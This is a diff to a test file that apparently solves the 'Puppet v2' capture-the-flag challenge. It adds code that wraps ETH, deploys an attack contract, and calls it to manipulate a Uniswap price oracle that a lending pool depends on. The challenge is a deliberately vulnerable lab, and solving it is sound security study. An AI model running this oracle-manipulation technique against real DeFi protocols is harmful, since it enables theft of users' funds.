@@ -81,8 +81,23 @@ describe('[Challenge] Puppet v2', function () {
         ).to.eq(300000n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
+    it('Execution', async function ()
+    {
         /** CODE YOUR SOLUTION HERE */
+
+        //Get our WETH
+        let weth_to_send = 199n * 10n ** 17n;
+        await weth.connect(player).deposit({value: weth_to_send});
+
+        //Deploy the attack contract
+        let AttackPuppet = await (await ethers.getContractFactory('AttackV2Puppet', player)).deploy(lendingPool.address, uniswapRouter.address, token.address, weth.address, uniswapExchange.address, uniswapFactory.address);
+
+        //Appove the attack contract so it can use transferFrom() to get its WETH & tokens
+        await weth.connect(player).approve(AttackPuppet.address, weth_to_send);
+        await token.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        // Swap tokens for ETH /reduce price oracle
+        await AttackPuppet.attack();
     });
 
     after(async function () {
